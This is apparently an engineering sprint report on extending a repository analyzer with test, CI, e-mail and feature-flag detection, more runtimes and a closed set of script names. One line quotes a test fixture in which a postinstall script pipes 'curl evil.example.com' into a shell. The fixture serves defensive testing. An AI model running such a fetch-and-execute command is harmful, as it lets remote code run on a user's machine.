# Sprint 0081 — what execution needs to see

Status: **Four signal categories, seven runtimes and a closed set of script names shipped. `ANALYZER_VERSION` → `repo-intelligence-v4`. No migration, no evidence-pack bump, no new dependency. One of the entry's four claims was checked and rejected rather than built.**

## The entry, verified

> `package.json` scripts are parsed and discarded, then re-parsed inside the sandbox in two places; there is no test-infrastructure, CI, e-mail or feature-flag detection; and `runtime` is empty for anything that is not Node or Docker.

| claim | verdict |
|---|---|
| scripts parsed and discarded | ✅ **stronger than written** — `parsePackageJson` fills `scriptNames`, and a repository-wide search finds no consumer outside its own test. Dead data since Sprint 2. |
| re-parsed inside the sandbox in two places | ✅ exactly two: `validation/orchestrator.ts:628` and `operations/agent-execution/execution.ts:425`. A third `planValidationSteps` call reuses what the second already derived. |
| no test-infrastructure, CI, e-mail or feature-flag detection | ✅ `SignalCategory` held six members: deployment, database, auth, payments, analytics, monitoring. |
| `runtime` empty outside Node and Docker | ✅ `detectRuntime` emits `node` from `package.json` and `docker` from a Dockerfile. Nothing else, ever. |

## The claim that did not survive checking

The entry lists the sandbox's two re-parses as part of the defect. They are not, and the implied fix is wrong.

`readPlan`'s own docblock states the reason it re-reads in every phase: *the plan is always derived from the filesystem the command is about to run against, never from a snapshot of an earlier invocation's belief about it.* Rule 52 forbids carrying raw untrusted manifest text across a durable step boundary in any case, so the alternative is not available even in principle.

Putting the script list in the snapshot *so the sandbox need not read it* would install a second source of truth for what a repository can do — and the two would eventually disagree, because a snapshot is pinned to one commit while the sandbox holds whatever that commit's tree contains after an install. That is a worse failure than the one the entry names, and it fails silently.

So the field shipped for a different job, and a test now keeps the two jobs apart. `scripts.test.ts` asserts that no module under `validation/`, `coding-agent/` or `operations/agent-execution/` imports `ProjectScripts`, or reads `.scripts` off anything named like a stored artefact. Proven red by pointing `readPlan` at `snapshot.scripts.declared`:

```
× reads .scripts only off a freshly parsed manifest
+   "src/modules/validation/orchestrator.ts",
```

## What the scripts field is for instead

Rule 78 says an agent's own checks are advisory and Vibe's independent validation is the verdict. A repository with no `test` script has neither: the agent's account of its work is all there is. `ProjectScripts` puts that fact in front of a person **before** the money is spent rather than after.

It is a **closed set** — `test`, `test:e2e`, `e2e`, `typecheck`, `lint`, `build`, `start` — because an arbitrary script name is unbounded untrusted text from a customer repository, and this field is rendered to a founder and handed to a model. Script *bodies* were already never retained and still are not; the parser's existing test asserts that a `postinstall` of `curl evil.example.com | sh` leaves no `curl` anywhere in the parse, and a second one now asserts the same of the detector's output.

`source` carries the distinction an empty list cannot. A null source means there was no manifest to read; a non-null source with an empty list means the manifest was read and declares none of them. A Python project has not declined to declare a test script — it has nowhere to declare one, and the human view says nothing about scripts in that case.

## The four categories

**Test tooling** — eleven rows: Vitest, Jest, Playwright, Cypress, Mocha, Jasmine, AVA, Karma, Testing Library, and pytest and RSpec through the non-Node manifest text. Each is its own signal with its own id, the same shape Stripe and Paddle already had; "does this repository have any tests at all" is `signalsByCategory(signals, "testing").length > 0`.

**Continuous integration** — GitHub Actions, GitLab CI, CircleCI, Jenkins, Azure Pipelines, Travis, Bitbucket Pipelines, Drone and Woodpecker. `.github/` was never in `GENERATED_SEGMENTS`, so those paths were visible to the analyzer the whole time; nothing looked at them. They are also unreachable by every rule the detector had, because a workflow file's basename is arbitrary — hence a new `pathPattern` field matched against the whole path.

**Existence only, deliberately.** Rule 74 wants a founder told before a merge click that moving a default branch can trigger their own CI/CD, and the honest version of that sentence names which workflows run on a push to that branch. Doing so needs the `on:` block, which needs a YAML parser this repository does not have and will not gain on the strength of one detector. A count of workflow files is a fact; "this will deploy your site" would be a guess wearing a fact's clothes. The merge panel's existing unconditional warning stays as it is.

**E-mail sending** — Resend, SendGrid, Nodemailer, Postmark, Mailgun, Amazon SES, React Email. **Feature flagging** — LaunchDarkly, Vercel Flags, Flagsmith, Unleash, Statsig, Split, ConfigCat, GrowthBook. Both are dependency-driven rows in the table the file already says is the way to extend it.

Workflow evidence is **sorted and capped at three**. A snapshot is stored, reused by hash and compared across runs, so tree order must not decide what it says, and a repository with thirty workflows must not put thirty rows into something a model reads.

## Runtimes past Node

Python, Go, Ruby, Rust, PHP, Java/JVM, .NET and Deno, each named from the manifest that declares it. **No versions**, and that is the whole reason the list is short: a version means parsing TOML, INI and Gradle, and `context.ts` deliberately holds non-Node manifests as lowercased text precisely so no such parser is needed. Node keeps its version because `package.json` is genuinely parsed, so `engines.node` is a fact rather than a substring.

**Bun is deliberately absent.** `bun.lockb` proves which package manager resolved the tree — which `detectPackageManager` already reports — not that the application runs on Bun rather than Node. A test pins that: a repository with `bun.lockb` and a `package.json` reports package manager `bun` and runtime `node`, and nothing else.

## The label the new categories would have produced

Both evidence builders interpolated `signal.category` raw into a founder-facing sentence. Six members happened to read as English; the four new ones do not. `feature_flags` would have reached a screen with its underscore intact, and "ci integration signal" is not a phrase. `SIGNAL_CATEGORY_LABELS` is now the single lookup, published beside `BUSINESS_SURFACE_LABELS` for the reason that map already gives.

The second builder had a subtler problem, which the new categories exposed rather than caused: every signal was described as *"a dependency, not proof the feature works"*, including the ones detected from a config file. A workflow file is not a dependency, and the one place built to keep a model honest is the worst place to tell it a small untruth about where a fact came from. The parenthetical is now derived from the evidence kinds actually present.

**Evidence ids are unchanged.** `repo.integration.vitest` is a new id, not a changed one, and a v3 snapshot rebuilt today mints nothing it never cited — the same argument Sprint 0079 made for declared prices, and the reason there is no pack version bump.

## A defect found while wiring the human view

`repository_intelligence_snapshots.result` is a JSON column holding whatever analyzer wrote the row, and the project page renders the newest successful row whatever version produced it. A stored v3 snapshot has no `scripts` key at all, so a capability builder reading `snapshot.scripts.declared` would have thrown on the first customer whose last scan predates this sprint. It is read defensively, with a test that deletes the field and asserts the view still renders.

## What was found and not fixed

- **`.github/workflows` content stays unread**, so the merge panel's CI warning stays a hedge. Closing it needs a decision about a YAML parser, not a detector.
- **The other snapshot fixtures across five modules still use `as unknown as RepositoryIntelligenceSnapshot`**, so they silently lack `scripts`. They do not reach it; that they *could* silently lack any future required field is a real, pre-existing weakness in those fixtures and is not this sprint's to fix.
- **No ADR.** This establishes no new decision. "A snapshot never sources a command" is rule 52 and ADR 0006 applied to a new field, and it is now written in the module's own rules with a test behind it.

(lint 0 errors/typecheck clean/**6,348 tests**/build green)
